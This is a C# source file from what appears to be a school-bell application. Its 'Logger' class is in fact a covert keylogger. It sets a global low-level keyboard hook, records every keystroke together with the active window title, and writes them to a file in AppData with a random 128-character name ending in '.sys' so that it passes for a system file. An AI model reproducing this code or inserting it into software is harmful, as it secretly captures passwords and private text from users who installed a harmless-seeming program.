using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace RcisSchoolBell.lib
{
    internal static class Logger
    {
        private static string _active;
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            var buff = new StringBuilder(nChars);
            var handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }
        private delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WhKeyboardLl = 13;
        private const int WmKeydown = 0x0100;
        private static readonly KeyboardProc Proc = HookCallback;
        private static IntPtr _hookId = IntPtr.Zero;

        private static StreamWriter _sr;
        static Logger()
        {
        }


       // [DllImport("Winmm.dll")] // Support the hardware
       // public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);//????????????? cd
       
        public static void Hook()
        {            
            //mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
            _sr = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                + "\\" + RandomString(128) + ".sys");

            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                _hookId = SetWindowsHookEx(WhKeyboardLl, Proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public static void UnHook()
        {
            _sr.Flush();
            _sr.Close();
            UnhookWindowsHookEx(_hookId);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WmKeydown)
            {
                var keyCode = Marshal.ReadInt32(lParam);
                if (!string.IsNullOrEmpty(_active) && _active != GetActiveWindowTitle())
                {
                    _active = GetActiveWindowTitle();
                    _sr.WriteLine();
                    _sr.WriteLine();
                    _sr.WriteLine(_active);
                    _sr.Write((Keys)keyCode);
                }
                else if (string.IsNullOrEmpty(_active))
                {
                    _active = GetActiveWindowTitle();
                    _sr.WriteLine(_active);
                    _sr.Write((Keys)keyCode);
                }
                else
                {
                    _sr.Write((Keys)keyCode);
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        /// <summary>
        /// ganarate randome string
        /// </summary>
        /// <param name="size">Size of string</param>
        /// <param name="lowerCase">true if lowe case, false for UpperCase</param>
        public static string RandomString(int size, bool lowerCase = true)
        {
            var builder = new StringBuilder();
            var random = new Random();
            for (var i = 0; i < size; i++)
            {
                var ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return lowerCase ? builder.ToString().ToLower() : builder.ToString();
        }
    }
}
